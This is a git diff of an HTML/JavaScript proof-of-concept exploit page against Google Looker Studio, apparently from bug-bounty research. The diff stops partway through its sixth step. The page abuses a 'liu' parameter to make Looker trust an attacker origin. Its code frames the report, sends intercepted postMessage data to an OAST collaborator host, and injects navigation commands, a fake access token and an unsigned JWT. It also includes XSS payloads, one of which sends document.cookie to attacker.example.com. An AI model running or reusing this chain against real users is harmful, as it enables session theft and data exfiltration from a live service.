@@ -1,236 +1,117 @@
 <!DOCTYPE html>
 <html>
-
 <head>
-    <title>Looker Studio - Full Exploit Chain PoC</title>
+    <title>Looker Studio - Embedding &amp; PostMessage PoC</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background: #0d1117;
-            color: #c9d1d9;
-            padding: 20px;
-        }
-
-        .header {
-            text-align: center;
-            padding: 20px 0;
-            border-bottom: 1px solid #30363d;
-            margin-bottom: 20px;
-        }
-
-        .header h1 {
-            color: #f85149;
-            font-size: 22px;
-        }
-
-        .header p {
-            color: #8b949e;
-            margin-top: 8px;
-            font-size: 14px;
-        }
-
-        .grid {
-            display: flex;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-
-        .panel {
-            background: #161b22;
-            border: 1px solid #30363d;
-            border-radius: 6px;
-            padding: 16px;
-            flex: 1;
-            min-width: 400px;
-        }
-
-        .panel h2 {
-            font-size: 14px;
-            color: #58a6ff;
-            margin-bottom: 12px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .badge {
-            display: inline-block;
-            padding: 2px 8px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: bold;
-        }
-
-        .badge-success {
-            background: #238636;
-            color: #fff;
-        }
-
-        .badge-danger {
-            background: #da3633;
-            color: #fff;
-        }
-
-        .badge-warn {
-            background: #d29922;
-            color: #fff;
-        }
-
-        .badge-info {
-            background: #1f6feb;
-            color: #fff;
-        }
-
-        #targetFrame {
-            width: 100%;
-            height: 450px;
-            border: 2px solid #f85149;
-            border-radius: 4px;
-            background: #0d1117;
-        }
-
-        .log-area {
-            background: #0d1117;
-            border: 1px solid #30363d;
-            border-radius: 4px;
-            padding: 10px;
-            font-family: 'Consolas', 'Courier New', monospace;
-            font-size: 12px;
-            max-height: 350px;
-            overflow-y: auto;
-            line-height: 1.6;
-        }
-
-        .log-entry {
-            padding: 2px 0;
-            border-bottom: 1px solid #21262d;
-        }
-
-        .log-time {
-            color: #484f58;
-        }
-
-        .log-success {
-            color: #3fb950;
-        }
-
-        .log-error {
-            color: #f85149;
-        }
-
-        .log-info {
-            color: #58a6ff;
-        }
-
-        .log-warn {
-            color: #d29922;
-        }
-
-        .log-critical {
-            color: #f85149;
-            font-weight: bold;
-            background: #3d1117;
-            padding: 4px;
-            border-radius: 3px;
-        }
-
-        .findings {
-            margin-top: 20px;
-            background: #161b22;
-            border: 1px solid #30363d;
-            border-radius: 6px;
-            padding: 16px;
-        }
-
-        .findings h2 {
-            color: #f85149;
-            font-size: 16px;
-            margin-bottom: 12px;
-        }
-
-        .finding-item {
-            padding: 8px 12px;
-            margin: 6px 0;
-            border-radius: 4px;
-            font-size: 13px;
-        }
-
-        .finding-confirmed {
-            background: #0d2818;
-            border-left: 3px solid #3fb950;
-        }
-
-        .finding-pending {
-            background: #2a1f00;
-            border-left: 3px solid #d29922;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 10px 0;
-        }
-
-        td,
-        th {
-            padding: 6px 10px;
-            text-align: left;
-            border-bottom: 1px solid #21262d;
-            font-size: 12px;
-        }
-
-        th {
-            color: #8b949e;
-        }
-
-        button {
-            background: #238636;
-            color: white;
-            border: 1px solid rgba(27, 31, 35, 0.15);
-            border-radius: 6px;
-            padding: 5px 16px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-
-        button:hover {
-            background-color: #2ea043;
-        }
-
-        button.danger {
-            background-color: #da3633;
-        }
-
-        button.danger:hover {
-            background-color: #b32b2b;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
+        .header { text-align: center; padding: 20px 0; border-bottom: 1px solid #30363d; margin-bottom: 20px; }
+        .header h1 { color: #f85149; font-size: 22px; }
+        .header p { color: #8b949e; margin-top: 8px; font-size: 14px; }
+        .grid { display: flex; gap: 20px; flex-wrap: wrap; }
+        .panel { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; flex: 1; min-width: 400px; }
+        .panel h2 { font-size: 14px; color: #58a6ff; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
+        .badge { display: inline-block; padding: 2px 8px; border-radius: 20px; font-size: 11px; font-weight: bold; }
+        .badge-success { background: #238636; color: #fff; }
+        .badge-danger { background: #da3633; color: #fff; }
+        .badge-warn { background: #d29922; color: #fff; }
+        .badge-info { background: #1f6feb; color: #fff; }
+        #targetFrame { width: 100%; height: 450px; border: 2px solid #f85149; border-radius: 4px; background: #0d1117; }
+        .log-area { background: #0d1117; border: 1px solid #30363d; border-radius: 4px; padding: 10px; font-family: 'Consolas', monospace; font-size: 12px; max-height: 400px; overflow-y: auto; line-height: 1.6; }
+        .log-entry { padding: 2px 0; border-bottom: 1px solid #21262d; }
+        .log-time { color: #484f58; }
+        .log-success { color: #3fb950; }
+        .log-error { color: #f85149; }
+        .log-info { color: #58a6ff; }
+        .log-warn { color: #d29922; }
+        .log-critical { color: #f85149; font-weight: bold; background: #3d1117; padding: 4px; border-radius: 3px; }
+        .findings { margin-top: 20px; background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; }
+        .findings h2 { color: #f85149; font-size: 16px; margin-bottom: 12px; }
+        .finding-item { padding: 8px 12px; margin: 6px 0; border-radius: 4px; font-size: 13px; }
+        .finding-confirmed { background: #0d2818; border-left: 3px solid #3fb950; }
+        .finding-pending { background: #2a1f00; border-left: 3px solid #d29922; }
+        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
+        td, th { padding: 6px 10px; text-align: left; border-bottom: 1px solid #21262d; font-size: 12px; }
+        th { color: #8b949e; }
+        button { background: #238636; color: white; border: 1px solid rgba(27,31,35,0.15); border-radius: 6px; padding: 5px 16px; font-size: 14px; font-weight: 500; cursor: pointer; margin: 5px 5px 0 0; }
+        button:hover { background-color: #2ea043; }
+        button.danger { background-color: #da3633; }
+        button.danger:hover { background-color: #b32b2b; }
+        button.warn { background-color: #d29922; }
+        button.warn:hover { background-color: #b8860b; }
+        .config-area { background: #0d1117; border: 1px solid #30363d; border-radius: 4px; padding: 10px; margin-bottom: 12px; }
+        .config-area label { color: #8b949e; font-size: 12px; display: block; margin-bottom: 4px; }
+        .config-area input { background: #161b22; color: #c9d1d9; border: 1px solid #30363d; border-radius: 4px; padding: 6px 10px; width: 100%; font-size: 13px; margin-bottom: 8px; font-family: monospace; }
+        code { background: #1c2128; padding: 2px 6px; border-radius: 3px; font-size: 12px; }
+        .explanation { background: #0d1117; border: 1px solid #30363d; border-radius: 4px; padding: 12px; margin: 12px 0; font-size: 12px; line-height: 1.8; }
+        .explanation h3 { color: #58a6ff; margin-bottom: 8px; font-size: 13px; }
+        .progress-bar { width: 100%; height: 6px; background: #21262d; border-radius: 3px; margin: 12px 0; overflow: hidden; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #238636, #3fb950); border-radius: 3px; transition: width 0.5s ease; width: 0%; }
+        .step-indicator { display: flex; gap: 8px; flex-wrap: wrap; margin: 8px 0; }
+        .step-dot { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: bold; border: 2px solid #30363d; color: #484f58; transition: all 0.3s ease; }
+        .step-dot.active { border-color: #d29922; color: #d29922; animation: pulse 1s infinite; }
+        .step-dot.done { border-color: #3fb950; color: #3fb950; background: #0d2818; }
+        .step-dot.fail { border-color: #f85149; color: #f85149; background: #3d1117; }
+        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
     </style>
 </head>
-
 <body>
     <div class="header">
-        <h1>Google Looker Studio &mdash; Full Exploit Chain PoC</h1>
-        <p>Demonstrating Framing Bypass, Data Exfiltration, and Reverse Framing via PostMessage Origin Trust Override
-        </p>
+        <h1>Google Looker Studio &mdash; PostMessage Origin Trust PoC</h1>
+        <p>CVE Candidate: Origin Trust Override via <code>liu</code> query parameter + PostMessage handler chain</p>
     </div>
 
     <div class="grid">
-        <div class="panel">
-            <h2>Victim's View (Looker Studio)</h2>
-            <p style="margin-bottom:8px;font-size:12px;color:#8b949e;">
-                Attack Vector: <code id="frameUrl">loading...</code>
-            </p>
+        <div class="panel" style="flex: 1.2;">
+            <h2>Target Configuration</h2>
+            <div class="config-area">
+                <label>Looker Studio Report URL (public report with /appview or embed)</label>
+                <input type="text" id="reportUrl" value="https://lookerstudio.google.com/reporting/be06bd59-7ae1-4373-825c-075088ba0d51/page/p0/appview" placeholder="https://lookerstudio.google.com/reporting/REPORT_ID/page/PAGE_ID" />
+
+                <label>OAST / Burp Collaborator (for exfiltration + reverse framing proof)</label>
+                <input type="text" id="oastUrl" value="https://7z7kqkxfeu6suua3sb1vsor2ltrkfd32.oastify.com" placeholder="https://YOUR_ID.oastify.com" />
+            </div>
+
+            <div class="explanation">
+                <h3>How the Origin Trust Override Works</h3>
+                <p>
+                    The Looker Studio JS bundle reads the <code>liu</code> (Looker Iframe URL) query parameter
+                    and uses it as the <b>trusted parent origin</b> (<code>Po</code>) for postMessage validation.
+                </p>
+                <p>
+                    <b>Code path (lg_Fqb):</b><br>
+                    <code>Po = window.preload?.trustedLookerOrigin || (isAppView || !isProd ? liu : "")</code>
+                </p>
+                <p>
+                    <b>Message handler (line 4503):</b><br>
+                    <code>if (c.origin === b.Po &amp;&amp; typeof c.data === "string")</code><br>
+                    Once <code>Po</code> equals our origin, ALL registered message types are accepted.
+                </p>
+            </div>
+
+            <h2 style="margin-top: 16px;">Auto-Execution Progress</h2>
+            <div class="step-indicator" id="stepDots">
+                <div class="step-dot" id="dot-1">1</div>
+                <div class="step-dot" id="dot-2">2</div>
+                <div class="step-dot" id="dot-3">3</div>
+                <div class="step-dot" id="dot-4">4</div>
+                <div class="step-dot" id="dot-5">5</div>
+                <div class="step-dot" id="dot-6">6</div>
+                <div class="step-dot" id="dot-7">7</div>
+            </div>
+            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+            <p id="stepLabel" style="font-size:12px;color:#8b949e;margin-bottom:10px;">Initializing...</p>
+
+            <h2 style="margin-top: 16px;">Victim's View</h2>
             <iframe id="targetFrame" src="about:blank"></iframe>
-            <div style="margin-top: 10px; display: flex; gap: 10px;">
-                <button onclick="triggerReverseFraming()">Trigger Reverse Framing</button>
-                <button class="danger" onclick="triggerXSS()">Trigger XSS Payload</button>
+            <div style="margin-top: 10px;">
+                <button onclick="sendAllPayloads()">Restart Full Chain</button>
+                <button onclick="sendProbes()">Probes Only</button>
+                <button class="warn" onclick="triggerNavigate()">NAVIGATE</button>
+                <button class="warn" onclick="triggerProjectDetails()">PROJECT_DETAILS</button>
+                <button class="danger" onclick="triggerTokenRequest()">Token Inject</button>
+                <button class="danger" onclick="triggerEmailXSS()">Email XSS</button>
+                <button class="danger" onclick="triggerReverseFrame()">Reverse Frame</button>
             </div>
         </div>
 
@@ -241,185 +122,645 @@
     </div>
 
     <div class="findings">
-        <h2>Vulnerability Summary</h2>
+        <h2>Vulnerability Chain Analysis</h2>
         <div id="findingsArea"></div>
-        <table>
-            <tr>
-                <th>Vulnerability</th>
-                <th>Status</th>
-                <th>Details</th>
-            </tr>
-            <tr>
-                <td>Framing Bypass</td>
-                <td><span class="badge badge-success">CONFIRMED</span></td>
-                <td>Bypassed via <code>liu</code> parameter</td>
-            </tr>
-            <tr>
-                <td>Data Exfiltration</td>
-                <td><span class="badge badge-success">CONFIRMED</span></td>
-                <td>Intercepted postMessages from google.com</td>
-            </tr>
-            <tr>
-                <td>Reverse Framing</td>
-                <td><span class="badge badge-warn">TESTING</span></td>
-                <td>Injecting iframe via NAVIGATE/EMBED handlers</td>
-            </tr>
-            <tr>
-                <td>Stored XSS</td>
-                <td><span class="badge badge-warn">TESTING</span></td>
-                <td>Injecting HTML via innerHTML sink</td>
-            </tr>
+        <table id="findingsTable">
+            <tr><th>Step</th><th>Vulnerability</th><th>Status</th><th>Details</th></tr>
         </table>
     </div>
 
     <script>
-        // === CONFIGURATION ===
-        var ATTACKER_ORIGIN = window.location.origin;
-        var LOOKER_URL = 'https://lookerstudio.google.com/u/0/appview?liu=' + encodeURIComponent(ATTACKER_ORIGIN);
-        var OAST = 'https://0ghd7de8vnnlbnrw94io9h8v2m8dw5ku.oastify.com';
+    // ========================================================
+    // CONFIGURATION
+    // ========================================================
+    var ATTACKER_ORIGIN = window.location.origin;
+    var googleMessagesReceived = 0;
+    var registeredHandlers = new Set();
+    var chainRunning = false;
+    var TOTAL_STEPS = 7;
+    var FRAME_LOAD_TIMEOUT = 8000;   // ms to wait for iframe load
+    var STEP_DELAY = 2500;           // ms between steps after frame ready
+    var PROBE_INTERVAL = 150;        // ms between each probe message
 
-        // === STATE ===
-        var googleMessagesReceived = 0;
-        var framingConfirmed = false;
+    // ========================================================
+    // UI HELPERS
+    // ========================================================
+    function setProgress(pct) {
+        document.getElementById('progressFill').style.width = pct + '%';
+    }
+    function setStepLabel(text) {
+        document.getElementById('stepLabel').textContent = text;
+    }
+    function markStep(n, state) {
+        var dot = document.getElementById('dot-' + n);
+        if (!dot) return;
+        dot.className = 'step-dot';
+        if (state === 'active') dot.classList.add('active');
+        else if (state === 'done') dot.classList.add('done');
+        else if (state === 'fail') dot.classList.add('fail');
+    }
 
-        // === LOGGING ===
-        function log(msg, type) {
-            type = type || 'info';
-            var el = document.getElementById('log');
-            var time = new Date().toISOString().split('T')[1].split('.')[0];
-            var div = document.createElement('div');
-            div.className = 'log-entry';
-            div.innerHTML = '<span class="log-time">[' + time + ']</span> <span class="log-' + type + '">' + msg + '</span>';
-            el.appendChild(div);
-            el.scrollTop = el.scrollHeight;
+    // ========================================================
+    // LOGGING
+    // ========================================================
+    function log(msg, type) {
+        type = type || 'info';
+        var el = document.getElementById('log');
+        var time = new Date().toISOString().split('T')[1].split('.')[0];
+        var div = document.createElement('div');
+        div.className = 'log-entry';
+        div.innerHTML = '<span class="log-time">[' + time + ']</span> <span class="log-' + type + '">' + msg + '</span>';
+        el.appendChild(div);
+        el.scrollTop = el.scrollHeight;
+    }
+
+    function addFinding(text, confirmed) {
+        var area = document.getElementById('findingsArea');
+        var div = document.createElement('div');
+        div.className = 'finding-item ' + (confirmed ? 'finding-confirmed' : 'finding-pending');
+        div.innerHTML = (confirmed ? '<span class="badge badge-success">CONFIRMED</span> ' : '<span class="badge badge-warn">TESTING</span> ') + text;
+        area.appendChild(div);
+    }
+
+    function updateTable(step, vuln, status, details) {
+        var t = document.getElementById('findingsTable');
+        var tr = document.createElement('tr');
+        var badgeClass = status === 'CONFIRMED' ? 'badge-success' : status === 'FAILED' ? 'badge-danger' : 'badge-warn';
+        tr.innerHTML = '<td>' + step + '</td><td>' + vuln + '</td><td><span class="badge ' + badgeClass + '">' + status + '</span></td><td>' + details + '</td>';
+        t.appendChild(tr);
+    }
+
+    // ========================================================
+    // POSTMESSAGE LISTENER - intercept all responses
+    // ========================================================
+    window.addEventListener('message', function(e) {
+        var dataStr;
+        if (typeof e.data === 'string') {
+            dataStr = e.data.substring(0, 800);
+        } else {
+            try { dataStr = JSON.stringify(e.data).substring(0, 800); }
+            catch(err) { dataStr = String(e.data); }
         }
 
-        function addFinding(text, confirmed) {
-            var area = document.getElementById('findingsArea');
-            var div = document.createElement('div');
-            div.className = 'finding-item ' + (confirmed ? 'finding-confirmed' : 'finding-pending');
-            div.innerHTML = (confirmed ? '<span class="badge badge-success">CONFIRMED</span> ' : '<span class="badge badge-warn">TESTING</span> ') + text;
-            area.appendChild(div);
-        }
+        var safeData = dataStr.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        log('RECV [<b>' + e.origin + '</b>]: <code>' + safeData + '</code>', 'success');
 
-        // === POSTMESSAGE LISTENER ===
-        window.addEventListener('message', function (e) {
-            var dataStr;
-            if (typeof e.data === 'string') dataStr = e.data.substring(0, 500);
-            else try { dataStr = JSON.stringify(e.data).substring(0, 500); } catch (err) { dataStr = String(e.data); }
+        if (e.origin.indexOf('google.com') !== -1) {
+            googleMessagesReceived++;
+            log('DATA INTERCEPTED from google.com origin!', 'critical');
 
-            log('RECEIVED from <b>' + e.origin + '</b>: <code>' + dataStr.replace(/</g, '&lt;') + '</code>', 'success');
+            try {
+                var parsed = JSON.parse(e.data);
+                if (parsed.type) {
+                    log('Message type: <b>' + parsed.type + '</b>', 'critical');
+                    registeredHandlers.add(parsed.type);
 
-            if (e.origin.indexOf('google.com') !== -1) {
-                googleMessagesReceived++;
-                log('&#9888; DATA INTERCEPTED via Origin Trust Bypass!', 'critical');
-
-                // Exfiltrate to OAST
-                var img = new Image();
-                img.src = OAST + '/exfil?origin=' + encodeURIComponent(e.origin) + '&data=' + encodeURIComponent(dataStr);
-
-                if (googleMessagesReceived === 1) {
-                    addFinding('Data Exfiltration Confirmed: Intercepted postMessage from <code>' + e.origin + '</code>', true);
+                    if (parsed.type === 'URL') {
+                        addFinding('URL Exfiltration: Looker leaking internal URLs via postMessage to attacker origin', true);
+                        updateTable('A', 'URL Leak via postMessage', 'CONFIRMED', 'Type: URL, payload contains internal path');
+                    }
+                    if (parsed.type === 'REQUEST_ACCESS_TOKEN') {
+                        addFinding('Token Request Intercepted: Looker asked US for an access token', true);
+                        updateTable('A', 'Token Request Intercept', 'CONFIRMED', 'Looker trusts attacker as token provider');
+                    }
                 }
+            } catch(ex) {}
+
+            var oast = document.getElementById('oastUrl').value;
+            if (oast) {
+                var img = new Image();
+                img.src = oast + '/exfil?origin=' + encodeURIComponent(e.origin) + '&data=' + encodeURIComponent(dataStr.substring(0, 500));
             }
-        });
 
-        // === INIT ===
-        document.getElementById('frameUrl').textContent = LOOKER_URL;
-        log('PoC initialized. Attacker origin: <b>' + ATTACKER_ORIGIN + '</b>', 'info');
+            if (googleMessagesReceived === 1) {
+                addFinding('PostMessage Interception Confirmed: receiving data from <code>' + e.origin + '</code>', true);
+            }
+        }
 
+        // MessageChannel port transfer (Data Apps channel)
+        if (e.data === 'open_notebook_data_apps_iframe_channel' && e.ports && e.ports.length > 0) {
+            log('DATA APPS CHANNEL RECEIVED! Got MessagePort from Looker.', 'critical');
+            addFinding('Data Apps MessageChannel hijacked: received port for bidirectional comms', true);
+            var port = e.ports[0];
+            port.onmessage = function(pe) {
+                log('PORT MSG: <code>' + JSON.stringify(pe.data).substring(0, 500) + '</code>', 'critical');
+            };
+            port.postMessage('init_notebook_data_apps_iframe_channel');
+        }
+    });
+
+    // ========================================================
+    // BUILD TARGET URL
+    // ========================================================
+    function buildTargetUrl() {
+        var reportUrl = document.getElementById('reportUrl').value.trim();
+        if (!reportUrl) {
+            reportUrl = 'https://lookerstudio.google.com/reporting/be06bd59-7ae1-4373-825c-075088ba0d51/page/p0/appview';
+        }
+        var url = new URL(reportUrl);
+        url.searchParams.set('liu', ATTACKER_ORIGIN);
+        url.searchParams.set('release', 'r3');
+        url.searchParams.set('lem', 'true');
+        return url.toString();
+    }
+
+    // ========================================================
+    // SEND MESSAGE TO IFRAME
+    // ========================================================
+    function sendMsg(payload, label) {
         var frame = document.getElementById('targetFrame');
-        log('Loading Looker Studio...', 'info');
-        frame.src = LOOKER_URL;
+        if (!frame.contentWindow) {
+            log('Frame not loaded yet', 'error');
+            return;
+        }
+        var str = JSON.stringify(payload);
+        frame.contentWindow.postMessage(str, '*');
+        log('SENT [' + (label || payload.type) + ']: <code>' + str.substring(0, 300) + '</code>', 'info');
+    }
 
-        frame.onload = function () {
-            log('Iframe loaded.', 'info');
-            // Auto-send basic probes after load
-            setTimeout(sendBasicProbes, 2000);
+    // ========================================================
+    // STEP 1: Load target in iframe
+    // ========================================================
+    function loadTarget(callback) {
+        var targetUrl = buildTargetUrl();
+        var frame = document.getElementById('targetFrame');
+
+        markStep(1, 'active');
+        setStepLabel('Step 1/6: Loading Looker Studio in iframe...');
+        setProgress(5);
+
+        log('=== STEP 1: FRAMING ===', 'critical');
+        log('Target: <code>' + targetUrl + '</code>', 'info');
+        log('<b>liu</b>=' + ATTACKER_ORIGIN + ' injected to override Po', 'warn');
+
+        frame.src = targetUrl;
+
+        var loaded = false;
+
+        frame.onload = function() {
+            if (loaded) return;
+            loaded = true;
+            log('Iframe onload fired.', 'info');
+
+            setTimeout(function() {
+                try {
+                    var loc = frame.contentWindow.location.href;
+                    log('Same-origin access (unexpected): ' + loc, 'warn');
+                    markStep(1, 'fail');
+                } catch(e) {
+                    log('Cross-origin iframe confirmed - framing successful', 'success');
+                    addFinding('Framing: Looker Studio loaded in attacker-controlled iframe', true);
+                    updateTable('1', 'Framing', 'CONFIRMED', 'Cross-origin iframe with liu origin override');
+                    markStep(1, 'done');
+                }
+                setProgress(16);
+                if (callback) callback();
+            }, 2000);
         };
 
-        // Check for framing success
-        setTimeout(function () {
-            try {
-                frame.contentWindow.location.href;
-                log('Unexpected same-origin access.', 'warn');
-            } catch (e) {
-                framingConfirmed = true;
-                log('&#10004; Framing Bypass Confirmed (Cross-Origin)', 'success');
-                addFinding('Framing Bypass Confirmed: <code>liu</code> parameter removes X-Frame-Options', true);
+        frame.onerror = function() {
+            log('Frame load error - blocked by X-Frame-Options or CSP', 'error');
+            updateTable('1', 'Framing', 'FAILED', 'Blocked by server headers');
+            markStep(1, 'fail');
+            setProgress(16);
+            // Continue chain anyway - some steps may still work
+            if (callback) callback();
+        };
+
+        // Fallback: if onload never fires (e.g. redirect), continue after timeout
+        setTimeout(function() {
+            if (!loaded) {
+                loaded = true;
+                log('Frame load timeout - continuing chain anyway', 'warn');
+                markStep(1, 'done');
+                setProgress(16);
+                if (callback) callback();
             }
-        }, 5000);
+        }, FRAME_LOAD_TIMEOUT);
+    }
 
-        function sendMsg(payload) {
-            var str = JSON.stringify(payload);
-            frame.contentWindow.postMessage(str, '*');
-            log('SENT: <code>' + str + '</code>', 'info');
-        }
+    // ========================================================
+    // STEP 2: Send probes
+    // ========================================================
+    function sendProbes(callback) {
+        markStep(2, 'active');
+        setStepLabel('Step 2/6: Probing active message handlers...');
+        setProgress(28);
 
-        function sendBasicProbes() {
-            log('Sending initial probes...', 'info');
-            sendMsg({ type: "ACCESS_TOKEN", payload: {} });
-            sendMsg({ type: "READY", payload: {} });
-        }
+        log('=== STEP 2: HANDLER PROBING ===', 'critical');
 
-        // === REVERSE FRAMING PAYLOADS ===
-        function triggerReverseFraming() {
-            log('Attempting Reverse Framing (Embedding external content inside Looker)...', 'warn');
+        var handlerTypes = [
+            'ACCESS_TOKEN',
+            'LAAIDP_ID_TOKEN',
+            'LAAIDP_ID_TOKEN_ERROR',
+            'GOOGLE_AUTH_USER_EMAIL',
+            'NAVIGATE',
+            'PROJECT_DETAILS',
+            'REQUEST_ACCESS_TOKEN',
+            'REQUEST_CONTEXT',
+            'REQUEST_GOOGLE_AUTH_USER_EMAIL',
+            'GET_LAAIDP_ID_TOKEN',
+            'READY',
+            'URL',
+            'INTERACTION_CLICK'
+        ];
 
-            // Payload 1: NAVIGATE to external URL
+        handlerTypes.forEach(function(type, i) {
+            setTimeout(function() {
+                sendMsg({ type: type, payload: {} }, 'PROBE:' + type);
+            }, i * PROBE_INTERVAL);
+        });
+
+        var probeTime = handlerTypes.length * PROBE_INTERVAL + 500;
+
+        updateTable('2', 'Handler Probing', 'TESTING', 'Probing ' + handlerTypes.length + ' handler types');
+
+        setTimeout(function() {
+            if (googleMessagesReceived > 0) {
+                updateTable('2', 'Handler Response', 'CONFIRMED', 'Got ' + googleMessagesReceived + ' responses, handlers: ' + Array.from(registeredHandlers).join(', '));
+                markStep(2, 'done');
+            } else {
+                updateTable('2', 'Handler Response', 'TESTING', 'No responses yet (may arrive later)');
+                markStep(2, 'done');
+            }
+            setProgress(33);
+            if (callback) callback();
+        }, probeTime);
+    }
+
+    // ========================================================
+    // STEP 3: NAVIGATE injection
+    // ========================================================
+    function triggerNavigate(callback) {
+        markStep(3, 'active');
+        setStepLabel('Step 3/6: Injecting NAVIGATE commands...');
+        setProgress(44);
+
+        log('=== STEP 3: NAVIGATE INJECTION ===', 'critical');
+
+        sendMsg({
+            type: 'NAVIGATE',
+            payload: { url: '/reporting/create' }
+        }, 'NAVIGATE:create');
+
+        setTimeout(function() {
             sendMsg({
-                type: "NAVIGATE",
-                payload: { url: OAST + "/reverse-frame-test" }
-            });
+                type: 'NAVIGATE',
+                payload: { url: '/datasources/create' }
+            }, 'NAVIGATE:datasource');
+        }, 400);
 
-            // Payload 2: Update CONFIG with embedUrl
-            // Found in JS analysis: component properties often set via UPDATE or CONFIG messages
-            setTimeout(function () {
-                sendMsg({
-                    type: "UPDATE_COMPONENT",
-                    payload: {
-                        componentId: "main",
-                        config: { embedUrl: OAST + "/embed-test" }
-                    }
-                });
-            }, 500);
-
-            // Payload 3: PROJECT_DETAILS with external URL
-            setTimeout(function () {
-                sendMsg({
-                    type: "PROJECT_DETAILS",
-                    payload: {
-                        gitRepo: OAST + "/git-test",
-                        manifestUrl: OAST + "/manifest.json"
-                    }
-                });
-            }, 1000);
-        }
-
-        // === XSS PAYLOADS ===
-        function triggerXSS() {
-            log('Attempting Stored XSS via innerHTML Injection...', 'critical');
-
-            // Payload 1: GOOGLE_AUTH_USER_EMAIL (uses _.lg_2e / bypassSecurityTrustHtml)
+        setTimeout(function() {
             sendMsg({
-                type: "GOOGLE_AUTH_USER_EMAIL",
+                type: 'NAVIGATE',
                 payload: {
-                    googleAuthUserEmail: "victim@gmail.com<img src=x onerror=alert(document.domain)>"
+                    url: '/conversation?datasourceMap=' + encodeURIComponent('{"ds0":"ATTACKER_DATASOURCE_ID"}')
                 }
-            });
+            }, 'NAVIGATE:conversation');
+        }, 800);
 
-            // Payload 2: Custom ERROR message (often rendered as HTML)
-            setTimeout(function () {
-                sendMsg({
-                    type: "ERROR",
-                    payload: {
-                        message: "<h1>Control</h1><img src=x onerror=alert(document.domain)>",
-                        stack: "<b>Trace</b>"
-                    }
-                });
-            }, 500);
+        updateTable('3', 'NAVIGATE Injection', 'TESTING', 'Internal route manipulation: /reporting/create, /datasources/create, /conversation');
+
+        setTimeout(function() {
+            markStep(3, 'done');
+            setProgress(55);
+            if (callback) callback();
+        }, STEP_DELAY);
+    }
+
+    // ========================================================
+    // STEP 4: PROJECT_DETAILS injection
+    // ========================================================
+    function triggerProjectDetails(callback) {
+        markStep(4, 'active');
+        setStepLabel('Step 4/6: Injecting PROJECT_DETAILS...');
+        setProgress(60);
+
+        log('=== STEP 4: PROJECT_DETAILS INJECTION ===', 'critical');
+
+        var oast = document.getElementById('oastUrl').value || 'https://attacker.example.com';
+
+        sendMsg({
+            type: 'PROJECT_DETAILS',
+            payload: {
+                git_repo: oast + '/malicious-repo',
+                git_branch: 'main',
+                git_service: 'github'
+            }
+        }, 'PROJECT_DETAILS');
+
+        updateTable('4', 'PROJECT_DETAILS Injection', 'TESTING', 'External git_repo URL injected into app state');
+
+        setTimeout(function() {
+            markStep(4, 'done');
+            setProgress(70);
+            if (callback) callback();
+        }, STEP_DELAY);
+    }
+
+    // ========================================================
+    // STEP 5: Token injection
+    // ========================================================
+    function triggerTokenRequest(callback) {
+        markStep(5, 'active');
+        setStepLabel('Step 5/6: Injecting fake tokens...');
+        setProgress(78);
+
+        log('=== STEP 5: TOKEN INJECTION ===', 'critical');
+
+        // Inject controlled access token
+        sendMsg({
+            type: 'ACCESS_TOKEN',
+            payload: {
+                accessToken: 'ATTACKER_CONTROLLED_TOKEN_' + Date.now(),
+                expiresAt: new Date(Date.now() + 86400000).toISOString()
+            }
+        }, 'ACCESS_TOKEN:inject');
+
+        // Inject unsigned BYOID JWT
+        var header = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' }));
+        var payload = btoa(JSON.stringify({
+            sub: 'attacker@evil.com',
+            exp: Math.floor(Date.now() / 1000) + 72000,
+            email: 'attacker@evil.com',
+            iss: 'attacker-idp'
+        }));
+        var fakeJwt = header + '.' + payload + '.';
+
+        setTimeout(function() {
+            sendMsg({
+                type: 'LAAIDP_ID_TOKEN',
+                payload: {
+                    signedIdToken: fakeJwt,
+                    workforceProviderId: 'locations/global/workforcePools/attacker-pool/providers/evil'
+                }
+            }, 'LAAIDP_ID_TOKEN:inject');
+        }, 400);
+
+        updateTable('5', 'Token Injection', 'TESTING', 'Fake ACCESS_TOKEN + unsigned BYOID JWT injected');
+
+        setTimeout(function() {
+            markStep(5, 'done');
+            setProgress(88);
+            if (callback) callback();
+        }, STEP_DELAY);
+    }
+
+    // ========================================================
+    // STEP 6: XSS via email handler
+    // ========================================================
+    function triggerEmailXSS(callback) {
+        markStep(6, 'active');
+        setStepLabel('Step 6/6: Attempting XSS via GOOGLE_AUTH_USER_EMAIL...');
+        setProgress(92);
+
+        log('=== STEP 6: XSS VIA EMAIL HANDLER ===', 'critical');
+
+        sendMsg({
+            type: 'GOOGLE_AUTH_USER_EMAIL',
+            payload: {
+                googleAuthUserEmail: '<img src=x onerror="fetch(\'https://attacker.example.com/xss?cookie=\'+document.cookie)">'
+            }
+        }, 'EMAIL:xss-img');
+
+        setTimeout(function() {
+            sendMsg({
+                type: 'GOOGLE_AUTH_USER_EMAIL',
+                payload: {
+                    googleAuthUserEmail: '<svg onload="alert(document.domain)">'
+                }
+            }, 'EMAIL:xss-svg');
+        }, 400);
+
+        setTimeout(function() {
+            sendMsg({
+                type: 'GOOGLE_AUTH_USER_EMAIL',
+                payload: {
+                    googleAuthUserEmail: 'attacker@evil.com" onmouseover="alert(document.domain)'
+                }
+            }, 'EMAIL:attr-injection');
+        }, 800);
+
+        updateTable('6', 'XSS via Email', 'TESTING', 'HTML injection via GOOGLE_AUTH_USER_EMAIL handler');
+
